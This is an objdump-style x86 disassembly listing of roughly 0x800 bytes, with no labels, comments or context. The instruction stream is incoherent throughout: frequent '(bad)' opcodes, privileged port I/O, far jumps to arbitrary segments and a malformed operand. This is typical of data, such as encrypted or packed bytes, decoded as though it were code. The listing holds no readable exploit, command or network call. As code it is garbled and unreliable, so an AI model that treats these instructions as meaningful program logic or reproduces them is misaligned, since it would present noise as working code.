  413a92:	mov    ecx,0xa20db52a
  413a97:	sbb    al,0x89
  413a99:	or     al,0xcd
  413a9b:	aaa    
  413a9c:	fwait
  413a9d:	pop    ds
  413a9e:	push   es
  413a9f:	fbstp  TBYTE PTR [edi]
  413aa1:	es ds sti 
  413aa4:	inc    esp
  413aa5:	dec    esi
  413aa6:	push   ebx
  413aa7:	xor    eax,0xc561bf85
  413aac:	mov    ecx,ss
  413aae:	imul   esp,esp,0x262998eb
  413ab4:	lods   al,BYTE PTR ds:[esi]
  413ab5:	inc    edx
  413ab6:	(bad)  
  413ab7:	scas   al,BYTE PTR es:[edi]
  413ab8:	aas    
  413ab9:	sbb    al,0x73
  413abb:	inc    edx
  413abc:	or     eax,0x82a86644
  413ac1:	jno    0x413acd
  413ac3:	icebp  
  413ac4:	pop    edx
  413ac5:	das    
  413ac6:	mov    bl,0x2c
  413ac8:	cli    
  413ac9:	jmp    0x413ae3
  413acb:	ror    ecx,0xbb
  413ace:	adc    eax,0x3ccaadf4
  413ad3:	xchg   esi,eax
  413ad4:	xchg   ebp,eax
  413ad5:	fistp  WORD PTR [eax-0x42c1b45b]
  413adb:	ins    BYTE PTR es:[edi],dx
  413adc:	pop    eax
  413add:	dec    eax
  413ade:	adc    BYTE PTR [esi+edx*2],dl
  413ae1:	sbb    ebx,DWORD PTR ds:0x2cdc6b4d
  413ae7:	sbb    ah,BYTE PTR [esp+eax*8-0x6c]
  413aeb:	scas   eax,DWORD PTR es:[edi]
  413aec:	jp     0x413ab0
  413aee:	mov    ebp,0x25acbe15
  413af3:	dec    esi
  413af4:	jge    0x413b61
  413af6:	into   
  413af7:	imul   edi,DWORD PTR [esi-0x32],0x4d
  413afb:	sbb    dh,bl
  413afd:	mov    esi,0x3daac42d
  413b02:	inc    ebp
  413b03:	test   al,0x52
  413b05:	sub    BYTE PTR [edi+0x45],cl
  413b08:	std    
  413b09:	xchg   edx,eax
  413b0a:	sbb    DWORD PTR [eax+0x4cc858aa],esi
  413b10:	inc    esp
  413b11:	icebp  
  413b12:	rcr    DWORD PTR [edx+ebp*8],1
  413b15:	adc    eax,0x1503afe5
  413b1a:	add    eax,0x2d432feb
  413b1f:	shl    BYTE PTR [ebx+0x2a],cl
  413b22:	add    eax,0x6752c71c
  413b28:	push   edi
  413b29:	or     DWORD PTR [edi-0x20],ecx
  413b2c:	adc    ebp,ebp
  413b2e:	add    al,0x82
  413b30:	push   0xffffffd2
  413b32:	add    ch,BYTE PTR ds:[ebx]
  413b35:	jne    0x413b58
  413b37:	mov    bh,0x80
  413b39:	add    eax,DWORD PTR [ebp-0x65]
  413b3c:	in     al,dx
  413b3d:	ins    DWORD PTR es:[edi],dx
  413b3e:	loope  0x413b99
  413b40:	jb     0x413b60
  413b42:	pop    es
  413b43:	mov    dh,BYTE PTR [edx-0x28]
  413b46:	pop    es
  413b47:	leave  
  413b48:	mov    bh,0x75
  413b4a:	enter  0x8e2e,0xa2
  413b4e:	and    DWORD PTR [esi+0x460dd5d6],ebp
  413b54:	mov    eax,0x82279d5b
  413b59:	push   edi
  413b5a:	push   esi
  413b5b:	mov    WORD PTR [edx+eax*2],gs
  413b5e:	jnp    0x413b4b
  413b60:	shr    DWORD PTR [ecx],1
  413b62:	(bad)  [edi-0x4d08e0e3]
  413b68:	cmp    DWORD PTR [ebp+0x3d70fd12],edi
  413b6e:	imul   eax,edi,0x5f
  413b71:	fbld   TBYTE PTR [esi+0x6f14477e]
  413b77:	add    BYTE PTR [ebx+edx*8-0x5c01af8e],0xe5
  413b7f:	outs   dx,BYTE PTR ds:[esi]
  413b80:	add    cl,ch
  413b82:	sub    edi,ebx
  413b84:	hlt    
  413b85:	fdivr  st(0),st
  413b87:	pop    ebx
  413b88:	repnz xor eax,0x8e0782b6
  413b8e:	inc    esp
  413b8f:	xor    BYTE PTR [eax-0x48482e4f],0xa7
  413b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b97:	dec    eax
  413b98:	cli    
  413b99:	sbb    edx,DWORD PTR [eax+0x70]
  413b9c:	popf   
  413b9d:	push   0xffffffab
  413b9f:	retf   0x1e6f
  413ba2:	jmp    0x413bf1
  413ba4:	mov    ds:0xb058a04a,al
  413ba9:	xlat   BYTE PTR ds:[ebx]
  413baa:	jp     0x413b71
  413bac:	add    dl,ah
  413bae:	inc    eax
  413baf:	mov    BYTE PTR [edi+0x11],dl
  413bb2:	bound  ebp,QWORD PTR [eax+0x5c]
  413bb5:	out    0xa0,al
  413bb7:	jp     0x413c09
  413bb9:	fist   WORD PTR [eax]
  413bbb:	aad    0xc4
  413bbd:	lods   al,BYTE PTR ds:[esi]
  413bbe:	fwait
  413bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bc0:	xchg   edi,eax
  413bc1:	into   
  413bc2:	sub    al,0xd3
  413bc4:	pop    esi
  413bc5:	sbb    BYTE PTR [esi+eax*1],0xdf
  413bc9:	aas    
  413bca:	dec    ebp
  413bcb:	push   eax
  413bcc:	sbb    eax,0xffffff8f
  413bcf:	ret    0x9155
  413bd2:	sub    BYTE PTR [esp+edi*2-0x7a7cf3bd],0x66
  413bda:	(bad)  
  413bdc:	cmp    DWORD PTR [edx+eax*4+0xb],0xffffff8f
  413be1:	xchg   edx,eax
  413be2:	clc    
  413be3:	push   0xffffffcf
  413be5:	cwde   
  413be6:	imul   eax,DWORD PTR [edi-0x77],0xffffffe5
  413bea:	push   0x1ed4ad68
  413bef:	cmp    esi,DWORD PTR [edx+0x75]
  413bf2:	popf   
  413bf3:	dec    esi
  413bf4:	hlt    
  413bf5:	and    al,0xd9
  413bf7:	cmp    cl,al
  413bf9:	adc    eax,0x38a6cc73
  413bfe:	pop    edi
  413bff:	sar    BYTE PTR [ebp-0xe],1
  413c02:	sub    esp,DWORD PTR [edi]
  413c04:	adc    BYTE PTR [ecx],al
  413c06:	aas    
  413c07:	pop    edx
  413c08:	pop    edi
  413c09:	inc    edx
  413c0a:	pop    esp
  413c0b:	mov    edi,0x9d310b1f
  413c10:	fdiv   st,st(7)
  413c12:	in     al,dx
  413c13:	repz inc ebp
  413c15:	inc    ebp
  413c16:	repnz pop ss
  413c18:	mov    eax,ds:0x389c886a
  413c1d:	dec    edx
  413c1e:	or     eax,0x5eeaee72
  413c23:	lds    ebx,FWORD PTR [edx]
  413c25:	push   ecx
  413c26:	sbb    bl,BYTE PTR [eax]
  413c28:	pop    ss
  413c29:	sub    eax,0x4483b7fd
  413c2e:	aas    
  413c2f:	jmp    0x413bf8
  413c31:	sbb    DWORD PTR [edi+edi*1-0x2c],ebx
  413c35:	fidiv  DWORD PTR [ebx]
  413c37:	and    bh,BYTE PTR [ebx-0x6e]
  413c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c3b:	retf   0xabd4
  413c3e:	cmovnp esi,DWORD PTR [ebx-0x2c]
  413c42:	mov    esi,0x7610c00b
  413c47:	add    esi,ebx
  413c49:	adc    esp,ebx
  413c4b:	outs   dx,BYTE PTR ds:[esi]
  413c4c:	xlat   BYTE PTR ds:[ebx]
  413c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c4e:	sub    al,0x7
  413c50:	aam    0xfd
  413c52:	mov    al,ds:0x50b3a101
  413c57:	pop    eax
  413c58:	pop    ss
  413c59:	fild   DWORD PTR [esi+0xd]
  413c5c:	in     al,0xb2
  413c5e:	fnstenv [edx-0x75]
  413c61:	inc    esi
  413c62:	jmp    0x413ccf
  413c64:	outs   dx,BYTE PTR ds:[esi]
  413c65:	mov    ecx,0x48b479ac
  413c6a:	mov    eax,ds:0x8da1fc05
  413c6f:	push   esp
  413c70:	div    DWORD PTR [ebx+0x3dd793f5]
  413c76:	jb     0x413c78
  413c78:	in     eax,dx
  413c79:	mov    dh,BYTE PTR [esp+ecx*8-0x5f]
  413c7d:	dec    edx
  413c7e:	in     eax,0x0
  413c80:	lds    esp,FWORD PTR [edi+0x64]
  413c83:	lock scas eax,DWORD PTR es:[edi]
  413c85:	test   BYTE PTR [eax+eax*1+0x8],dh
  413c89:	cmp    al,0x60
  413c8b:	sbb    DWORD PTR [esi+edi*8+0x79],edx
  413c8f:	(bad)  
  413c90:	sbb    ecx,DWORD PTR [esi+0x5477fc87]
  413c96:	lock stc 
  413c98:	lock cdq 
  413c9a:	mov    dl,0x4f
  413c9c:	inc    esi
  413c9d:	mov    esi,0x4900c386
  413ca2:	retf   0x781
  413ca5:	add    DWORD PTR [edi],ebp
  413ca7:	pusha  
  413ca8:	inc    edx
  413ca9:	out    dx,al
  413caa:	mov    dl,0xb3
  413cac:	lock jp 0x413cfd
  413caf:	test   DWORD PTR [ebx-0x18],esi
  413cb2:	fdiv   QWORD PTR [ecx+0x23a908a2]
  413cb8:	fdiv   DWORD PTR [ebp-0x700312f7]
  413cbe:	add    eax,0xe242a799
  413cc3:	mov    bl,0x58
  413cc5:	xchg   edi,eax
  413cc6:	push   edi
  413cc7:	and    dh,bl
  413cc9:	or     DWORD PTR [ecx-0x50757a1d],ebx
  413ccf:	(bad)  
  413cd1:	mov    esi,0x957693d0
  413cd6:	jnp    0x413d29
  413cd8:	fst    QWORD PTR [ebp+0x73]
  413cdb:	xchg   edx,eax
  413cdc:	jno    0x6fb789fa
  413ce2:	dec    edx
  413ce3:	mov    ch,0xd2
  413ce5:	lods   al,BYTE PTR ds:[esi]
  413ce6:	shl    edx,0xe8
  413ce9:	dec    esp
  413cea:	into   
  413ceb:	cmp    eax,0x85dc5688
  413cf0:	mov    cl,0xe9
  413cf2:	(bad)  
  413cf3:	or     al,0x81
  413cf5:	adc    DWORD PTR [ebx+0x27],ebp
  413cf8:	mov    ebx,0xed95c0a6
  413cfd:	sub    BYTE PTR [esi],ch
  413cff:	mul    DWORD PTR [edx+0x78ba0498]
  413d05:	cs xchg esi,eax
  413d07:	adc    eax,0x8797e1a8
  413d0c:	bnd jmp 0x413d47
  413d0f:	pop    esp
  413d10:	aam    0x13
  413d12:	add    eax,0xdb4e9c46
  413d17:	aad    0xdc
  413d19:	pushf  
  413d1a:	stos   DWORD PTR es:[edi],eax
  413d1b:	mov    al,ds:0xcd2286b9
  413d20:	mov    cl,0xe1
  413d22:	dec    ebp
  413d23:	test   al,0xa6
  413d25:	sub    dh,dl
  413d27:	in     eax,0xba
  413d29:	xor    eax,0x6d4b114f
  413d2e:	jl     0x413ccb
  413d30:	(bad)  
  413d31:	fimul  WORD PTR [ebx+ecx*1+0x59350b05]
  413d38:	popf   
  413d39:	sbb    DWORD PTR [eax],eax
  413d3b:	mov    esi,0xaac0ae5a
  413d40:	push   ss
  413d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d42:	or     DWORD PTR [ebp+0x610699e],0xfffffffb
  413d49:	pop    edx
  413d4a:	leave  
  413d4b:	xchg   edi,eax
  413d4c:	in     eax,dx
  413d4d:	(bad)  
  413d4e:	cs pop es
  413d50:	or     al,0x20
  413d52:	mov    bl,0x56
  413d54:	gs fwait
  413d56:	std    
  413d57:	mov    bl,0xea
  413d59:	push   edx
  413d5a:	jmp    0xe47e:0x97bfc129
  413d61:	(bad)  
  413d62:	pop    ds
  413d63:	sub    DWORD PTR [edi+0x63d36db6],0xffffffe8
  413d6a:	stos   BYTE PTR es:[edi],al
  413d6b:	jg     0x413d62
  413d6d:	cmp    DWORD PTR [edi+edi*1],ebp
  413d70:	mov    bl,0xdc
  413d72:	sub    BYTE PTR [ecx+edx*1+0x5a],ah
  413d76:	xlat   BYTE PTR ds:[ebx]
  413d77:	clc    
  413d78:	sub    eax,0x6e6e8583
  413d7d:	das    
  413d7e:	into   
  413d7f:	mov    WORD PTR [edx],gs
  413d81:	cmp    al,0xf4
  413d83:	mul    ecx
  413d85:	cli    
  413d86:	enter  0xc982,0x24
  413d8a:	fist   DWORD PTR [ebx]
  413d8c:	fisttp WORD PTR [eax+0x44dc76bf]
  413d92:	xlat   BYTE PTR ds:[ebx]
  413d93:	lods   al,BYTE PTR ds:[esi]
  413d94:	inc    eax
  413d95:	pop    es
  413d96:	inc    ebx
  413d97:	int3   
  413d98:	es and ebx,edx
  413d9b:	pusha  
  413d9c:	inc    edi
  413d9d:	hlt    
  413d9e:	sbb    dh,BYTE PTR [eax+0xe]
  413da1:	sbb    ebx,DWORD PTR [esi]
  413da3:	stc    
  413da4:	adc    al,0x49
  413da6:	sub    DWORD PTR [ebx+0x44],edi
  413da9:	push   es
  413daa:	clc    
  413dab:	jo     0x413e1f
  413dad:	adc    ebx,ebp
  413daf:	or     ebx,DWORD PTR [ecx-0x35d2d611]
  413db5:	sub    bh,BYTE PTR [esi+0x25ca5dea]
  413dbb:	in     eax,0xc9
  413dbd:	je     0x413e11
  413dbf:	add    ebx,DWORD PTR [edi+0x71b5fa22]
  413dc5:	inc    esp
  413dc6:	mov    ebx,0xc501ce9b
  413dcb:	cmp    bl,BYTE PTR [ebp+0x4]
  413dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dcf:	stos   DWORD PTR es:[edi],eax
  413dd0:	sub    al,0xb5
  413dd2:	sub    ecx,esi
  413dd4:	push   ecx
  413dd5:	out    0xf0,eax
  413dd7:	push   ecx
  413dd8:	xchg   DWORD PTR [eax+0x2edb898b],edx
  413dde:	fcom   QWORD PTR [edi+ebx*4]
  413de1:	dec    ecx
  413de2:	xchg   edi,eax
  413de3:	xor    ebp,esp
  413de5:	daa    
  413de6:	call   0x801d:0xa531b6d2
  413ded:	stos   DWORD PTR es:[edi],eax
  413dee:	(bad)  
  413def:	jmp    0x3649:0x1d3a044e
  413df6:	jno    0x413dff
  413df8:	mov    ebp,0x67f7109
  413dfd:	push   esp
  413dfe:	test   eax,0x44c6a458
  413e03:	aas    
  413e04:	sbb    DWORD PTR [edx-0x38],ebp
  413e07:	mov    ebp,0xe3430589
  413e0c:	sub    DWORD PTR [ebx+0x24],ebp
  413e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e10:	add    edx,ebp
  413e12:	test   BYTE PTR [edx+0x5e],dh
  413e15:	fdivrp st(5),st
  413e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e18:	push   eax
  413e19:	push   0xffffff9c
  413e1b:	pop    edi
  413e1c:	push   edi
  413e1d:	loope  0x413e50
  413e1f:	mov    esi,esp
  413e21:	pandn  mm6,QWORD PTR [esi]
  413e24:	in     eax,dx
  413e25:	and    dl,BYTE PTR [edi-0x199c8d55]
  413e2b:	push   ecx
  413e2c:	mov    al,BYTE PTR [ecx]
  413e2e:	inc    esi
  413e2f:	pop    ss
  413e30:	outs   dx,DWORD PTR ds:[esi]
  413e32:	fst    DWORD PTR [edx+0x4244be5e]
  413e38:	fisubr DWORD PTR [ebx+0xa]
  413e3b:	jae    0x413dff
  413e3d:	sub    eax,0x848802e1
  413e42:	add    esp,ebx
  413e44:	xchg   esi,eax
  413e45:	fcmovnb st,st(0)
  413e47:	mov    dh,0x98
  413e49:	js     0x413de7
  413e4b:	sbb    bl,cl
  413e4d:	mov    ?,WORD PTR [ebx]
  413e4f:	jnp    0x413e76
  413e51:	clc    
  413e52:	adc    eax,0x12b6ed7e
  413e57:	dec    ecx
  413e58:	dec    ebp
  413e59:	push   es
  413e5a:	push   ss
  413e5b:	mov    dh,0x11
  413e5d:	repnz add BYTE PTR [ebp+0x7c3b7ee8],0xf4
  413e65:	or     ch,al
  413e67:	push   esp
  413e68:	mov    DWORD PTR [eax+0x5d089628],0xfbc37feb
  413e72:	mov    eax,0x2f307e40
  413e77:	cld    
  413e78:	and    esp,DWORD PTR [edi-0x7b]
  413e7b:	es or  al,dl
  413e7e:	or     BYTE PTR [esi],0x49
  413e81:	fs repnz dec ecx
  413e84:	push   ebp
  413e85:	mov    esi,0xd365af91
  413e8a:	pop    eax
  413e8b:	pop    ebp
  413e8c:	mov    eax,ds:0xd7e51446
  413e91:	int    0x89
  413e93:	dec    edi
  413e94:	mov    ebp,0xba65f646
  413e99:	shl    DWORD PTR [esi+0x17af13a1],cl
  413e9f:	xor    al,0xfe
  413ea1:	pop    ecx
  413ea2:	xor    dh,dh
  413ea4:	scas   al,BYTE PTR es:[edi]
  413ea5:	push   eax
  413ea6:	or     BYTE PTR ds:0xe56d6204,bh
  413eac:	sahf   
  413ead:	cs cmc 
  413eaf:	out    dx,eax
  413eb0:	es sti 
  413eb2:	adc    BYTE PTR [ecx],ah
  413eb4:	xor    BYTE PTR [edx+0x74],bl
  413eb7:	add    DWORD PTR [ecx+0x3e],esp
  413eba:	ror    DWORD PTR [edi],1
  413ebc:	mov    ebp,0x69fa7666
  413ec1:	fistp  WORD PTR [ebx-0x3ff67a61]
  413ec7:	rcr    ebp,1
  413ec9:	es cmc 
  413ecb:	sbb    DWORD PTR [ecx],edx
  413ecd:	push   ebp
  413ece:	out    dx,eax
  413ecf:	cmc    
  413ed0:	cmp    bl,bh
  413ed2:	clc    
  413ed3:	inc    ebx
  413ed4:	les    ebp,FWORD PTR [si+0x40]
  413ed8:	add    DWORD PTR [edi+0x40],ebx
  413edb:	mov    eax,ds:0x5ff6adc4
  413ee0:	loope  0x413e92
  413ee2:	mov    bl,0x98
  413ee4:	fst    DWORD PTR [edx-0x60]
  413ee7:	lea    edx,[edi-0x26]
  413eea:	xor    bh,BYTE PTR [esi+0x42c61a6c]
  413ef0:	jae    0x413f2e
  413ef2:	aas    
  413ef3:	dec    eax
  413ef4:	jae    0x413f4a
  413ef6:	lods   al,BYTE PTR ds:[esi]
  413ef7:	repz sub bh,BYTE PTR [edi-0x5a]
  413efb:	popf   
  413efc:	daa    
  413efd:	or     al,0xdb
  413eff:	adc    DWORD PTR [edx],esi
  413f01:	xor    bl,BYTE PTR [edx-0xad4eb4c]
  413f07:	mov    dh,0xc6
  413f09:	and    ecx,DWORD PTR [esp+ebp*8+0x54]
  413f0d:	sar    DWORD PTR [edi],0x63
  413f10:	aam    0x5b
  413f12:	jbe    0x413f5a
  413f14:	jg     0x413f93
  413f16:	xor    edi,DWORD PTR [ebx+0x53bbee47]
  413f1c:	push   eax
  413f1d:	dec    esi
  413f1e:	jno    0x413f17
  413f20:	jb     0x413ed9
  413f22:	sub    BYTE PTR ds:0x4edab268,dl
  413f28:	rol    BYTE PTR [edi+eax*8-0x25],cl
  413f2c:	nop
  413f2d:	sar    ecx,cl
  413f2f:	cmp    edi,DWORD PTR [edi+0x4119d7e9]
  413f35:	rcr    DWORD PTR [esi+0xf91f577],1
  413f3b:	jmp    0x477e:0xd5a5d604
  413f42:	sub    eax,0x31877f2f
  413f47:	or     DWORD PTR [eax+0x41],esi
  413f4a:	jns    0x413fab
  413f4c:	or     ebp,DWORD PTR [esi]
  413f4e:	fisubr DWORD PTR [ecx]
  413f50:	mov    edx,0xea404292
  413f55:	rol    BYTE PTR [ecx+eax*1],0x22
  413f59:	xchg   edi,eax
  413f5a:	retf   
  413f5b:	gs pop ss
  413f5d:	arpl   WORD PTR [ecx-0x1b433ccf],cx
  413f63:	jae    0x413fd9
  413f65:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  413f67:	inc    eax
  413f68:	sub    bl,BYTE PTR [ebx]
  413f6a:	adc    eax,0xe5a3f91
  413f6f:	cwde   
  413f70:	pop    ecx
  413f71:	dec    ebx
  413f72:	arpl   WORD PTR [edx],bx
  413f74:	(bad)  
  413f75:	repz or al,0x3
  413f78:	rcr    DWORD PTR [edx+0x740b69c6],0x7e
  413f7f:	xchg   edi,eax
  413f80:	mov    ebp,DWORD PTR [eax-0x5c]
  413f83:	ins    DWORD PTR es:[edi],dx
  413f84:	xchg   esi,eax
  413f85:	adc    al,0x11
  413f87:	add    BYTE PTR [esp+eax*4-0x5],cl
  413f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f8c:	xor    eax,0x91c14f25
  413f91:	vunpckhps xmm3,xmm6,XMMWORD PTR [edi]
  413f95:	cmp    al,0xba
  413f97:	mov    ecx,0x48b6d7bd
  413f9c:	mov    dl,0x1a
  413f9e:	xor    al,0x29
  413fa0:	xor    edx,DWORD PTR [esp+ebp*4-0x15]
  413fa4:	out    dx,eax
  413fa5:	(bad)  [esi+esi*2-0x5516e7f5]
  413fac:	ins    BYTE PTR es:[edi],dx
  413fad:	stos   BYTE PTR es:[edi],al
  413fae:	sbb    al,0x83
  413fb0:	fwait
  413fb1:	pop    ss
  413fb2:	(bad)  
  413fb4:	sbb    eax,0x18d90b81
  413fb9:	enter  0xe035,0xc7
  413fbd:	cmp    dh,BYTE PTR [ecx+0xc5c6983]
  413fc3:	pop    ebp
  413fc4:	fadd   DWORD PTR [edx-0x25]
  413fc7:	dec    ecx
  413fc8:	mov    ds:0x7a29e325,eax
  413fcd:	(bad)  
  413fce:	sub    bl,ch
  413fd0:	cmp    al,0x9d
  413fd2:	or     eax,0xaf4b5a21
  413fd7:	call   FWORD PTR [ebx]
  413fd9:	es pop eax
  413fdb:	push   edi
  413fdc:	mov    dh,0x77
  413fde:	cli    
  413fdf:	aam    0xbc
  413fe1:	loope  0x413f80
  413fe3:	jmp    0x414028
  413fe5:	mov    ds:0x628f2dca,al
  413fea:	jae    0x413f94
  413fec:	inc    edx
  413fed:	sar    DWORD PTR [ebx-0x7b],0x2
  413ff1:	dec    ebx
  413ff2:	(bad)  
  413ff3:	adc    BYTE PTR [ecx+edi*8-0xd2c4ad2],bl
  413ffa:	push   0x4b
  413ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ffd:	dec    edx
  413ffe:	loopne 0x41401e
  414000:	pop    ebp
  414001:	in     eax,dx
  414002:	cdq    
  414003:	push   esi
  414004:	ror    DWORD PTR [eax+0x13],0xce
  414008:	push   eax
  414009:	test   DWORD PTR [esi],ecx
  41400b:	sub    esp,DWORD PTR [edi+edi*2]
  41400e:	(bad)  
  41400f:	test   eax,0xa028def0
  414014:	dec    esp
  414015:	cmp    al,BYTE PTR [edx+0x34]
  414018:	(bad)  
  41401a:	loope  0x413fa6
  41401c:	jne    0x41409c
  41401e:	loop   0x414097
  414020:	stos   DWORD PTR es:[edi],eax
  414021:	ret    0x3567
  414024:	xor    bl,BYTE PTR [ebp-0x74]
  414027:	ffree  st(7)
  414029:	inc    esp
  41402a:	ins    BYTE PTR es:[edi],dx
  41402b:	scas   eax,DWORD PTR es:[edi]
  41402c:	out    dx,eax
  41402d:	ret    
  41402e:	rcr    BYTE PTR [esi+0x62c997b3],0xbe
  414035:	cld    
  414036:	sub    DWORD PTR [ebp+0x79156255],esi
  41403c:	dec    ecx
  41403d:	pop    esi
  41403e:	enter  0x71da,0x52
  414042:	mov    al,0x6b
  414044:	scas   al,BYTE PTR es:[edi]
  414045:	mov    ds:0x33c8e54,eax
  41404a:	repnz add BYTE PTR [edx+0x1],dh
  41404e:	js     0x414065
  414050:	push   0x7d981768
  414055:	cmc    
  414056:	loopne 0x4140b8
  414058:	(bad)  
  414059:	jmp    0x413ffc
  41405b:	loope  0x4140dc
  41405d:	jnp    0x4140a7
  41405f:	cmp    ch,dh
  414061:	sbb    al,0x36
  414063:	and    dh,BYTE PTR [edi-0x223fdfc6]
  414069:	push   edx
  41406a:	sub    al,0xdf
  41406c:	pop    ecx
  41406d:	retf   
  41406e:	ins    BYTE PTR es:[edi],dx
  41406f:	jmp    0x24a:0x9cadd5d2
  414076:	lds    edx,FWORD PTR [ebp+0x48f23ba2]
  41407c:	fcompp 
  41407e:	dec    ebp
  41407f:	imul   ebp,ebx,0xffffffff
  414082:	mov    bh,0x8
  414084:	and    dh,BYTE PTR [ebp+ecx*8-0x19]
  414088:	popf   
  414089:	ja     0x41407a
  41408b:	or     BYTE PTR [ebx],0x34
  41408e:	jns    0x414017
  414090:	sbb    al,bl
  414092:	or     eax,0x62a561bd
  414097:	sub    ebp,edi
  414099:	pop    ecx
  41409a:	fdiv   st(5),st
  41409c:	lods   al,BYTE PTR ds:[esi]
  41409d:	repz shr DWORD PTR [ecx+0x30fe225d],cl
  4140a4:	inc    ebp
  4140a5:	stc    
  4140a6:	(bad)  
  4140a8:	fild   QWORD PTR [esi+0x39]
  4140ab:	out    0xd8,al
  4140ad:	int3   
  4140ae:	nop/reserved BYTE PTR [eax+0x6f385e07]
  4140b5:	leave  
  4140b6:	loop   0x41404d
  4140b8:	bound  edi,QWORD PTR [ebx-0x6e]
  4140bb:	aam    0x22
  4140bd:	call   DWORD PTR ds:0xa9a42b2b
  4140c3:	xchg   DWORD PTR ds:0x11516743,ebp
  4140c9:	mov    esp,0x511258ad
  4140ce:	jnp    0x414090
  4140d0:	pop    ss
  4140d1:	enter  0x3d6f,0x54
  4140d5:	lahf   
  4140d6:	into   
  4140d7:	xchg   ebp,eax
  4140d8:	pop    esi
  4140d9:	(bad)  
  4140da:	mov    dh,bl
  4140dc:	or     eax,0xbdfaff0e
  4140e1:	mov    ebx,0xefc09c7b
  4140e6:	jmp    0x84ef:0xed97683e
  4140ed:	sbb    ebx,DWORD PTR [eax+0x36]
  4140f0:	int    0xc
  4140f2:	clc    
  4140f3:	test   DWORD PTR [ebp-0x5f7d7455],esi
  4140f9:	push   0x1eda241
  4140fe:	je     0x414131
  414100:	scas   eax,DWORD PTR es:[edi]
  414101:	scas   al,BYTE PTR es:[edi]
  414102:	test   eax,0x602a4a83
  414107:	ret    0x7e1c
  41410a:	out    0xa4,eax
  41410c:	fcmovne st,st(1)
  41410e:	in     eax,0xdb
  414110:	add    eax,0x77022fa0
  414115:	sbb    al,0xb2
  414117:	push   es
  414118:	mov    cl,0xa5
  41411a:	cmp    eax,0xacc5b71f
  41411f:	dec    edx
  414120:	xchg   BYTE PTR [esi],cl
  414122:	or     dl,BYTE PTR [eax-0x68771981]
  414128:	mov    ebp,0xb6410540
  41412d:	or     dh,al
  41412f:	pop    ebp
  414130:	(bad)  
  414131:	and    ebp,DWORD PTR [ebp-0x2f6a5274]
  414137:	ficom  DWORD PTR [ecx]
  414139:	or     DWORD PTR [edx+0x695b4916],edx
  41413f:	cmp    DWORD PTR [ebp-0x40],esp
  414142:	call   0x7eeb2e30
  414147:	adc    DWORD PTR [edi-0x3f],eax
  41414a:	xor    edi,DWORD PTR ds:0xcf6488ab
  414150:	pushf  
  414151:	sbb    eax,0x30d11eb5
  414156:	imul   ebx,DWORD PTR [ebx-0x1f],0x33b573df
  41415d:	xor    BYTE PTR [ecx+ebx*8],0x4
  414161:	jle    0x4141b8
  414163:	dec    ecx
  414164:	fidiv  WORD PTR [eax]
  414166:	(bad)  
  414167:	arpl   WORD PTR [ecx-0x41],dx
  41416a:	repnz pop es
  41416c:	test   cl,al
  41416e:	mov    bl,0xd8
  414170:	or     eax,0x5d8da8fe
  414175:	(bad)  
  414177:	(bad)  
  414178:	das    
  414179:	imul   eax,DWORD PTR [eax],0x32
  41417c:	fwait
  41417d:	mov    eax,ds:0xcb4ca7ca
  414182:	dec    ecx
  414183:	jo     0x414172
  414185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414186:	(bad)  
  414187:	out    dx,al
  414188:	jge    0x414171
  41418a:	cmp    ebx,edi
  41418c:	aad    0x60
  41418e:	add    al,0x38
  414190:	add    eax,DWORD PTR [esi]
  414192:	popa   
  414193:	aaa    
  414194:	and    BYTE PTR [ecx+0x28],ah
  414197:	inc    DWORD PTR [eax-0x24]
  41419a:	loopne 0x414124
  41419c:	sbb    DWORD PTR [ebp-0x56add189],ebp
  4141a2:	cmp    BYTE PTR [ecx-0x1fd43dc0],cl
  4141a8:	fwait
  4141a9:	sbb    esi,ebx
  4141ab:	push   0x7b
  4141ad:	jle    0x4141d7
  4141af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141b0:	pop    ebp
  4141b1:	cmp    DWORD PTR [bp+di],ebx
  4141b4:	outs   dx,BYTE PTR ds:[esi]
  4141b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141b6:	and    BYTE PTR es:[eax],cl
  4141b9:	rcl    BYTE PTR [ebx+0x2e8d61ef],0x49
  4141c0:	ins    DWORD PTR es:[edi],dx
  4141c1:	sub    esp,DWORD PTR [esi+0x3e]
  4141c4:	inc    esi
  4141c5:	mov    ds:0x3bce7693,al
  4141ca:	jg     0x414183
  4141cc:	dec    ebx
  4141cd:	xchg   edi,eax
  4141ce:	imul   esi,DWORD PTR [ebx-0x17],0x8a4dbd8c
  4141d5:	push   esi
  4141d6:	mov    dl,0x1
  4141d8:	gs aaa 
  4141da:	aad    0x78
  4141dc:	push   edx
  4141dd:	xchg   ecx,eax
  4141de:	mov    edx,0x561eb47b
  4141e3:	je     0x4141ac
  4141e5:	(bad)  
  4141e6:	fmul   DWORD PTR [ecx-0x63]
  4141e9:	or     esi,edx
  4141eb:	inc    ecx
  4141ec:	scas   al,BYTE PTR es:[edi]
  4141ed:	enter  0x810,0x56
  4141f1:	stos   DWORD PTR es:[edi],eax
  4141f2:	pop    ss
  4141f3:	push   ebp
  4141f5:	loopne 0x414197
  4141f7:	xchg   ah,ch
  4141f9:	sub    DWORD PTR [esi],eax
  4141fb:	(bad)  
  4141fc:	xor    al,0xe5
  4141fe:	xchg   esi,eax
  4141ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414200:	cmp    al,0x44
  414202:	das    
  414203:	loopne 0x414258
  414205:	ret    0x5428
  414208:	xchg   esi,eax
  414209:	popf   
  41420a:	sbb    DWORD PTR [ebp+0x2b],ebp
  41420d:	sbb    eax,0x977c77f5
  414212:	sbb    BYTE PTR [edi+0xa02c77e],dl
  414218:	mov    cl,0x26
  41421a:	push   esp
  41421b:	loope  0x41422f
  41421d:	inc    ebp
  41421e:	call   0xf19300d2
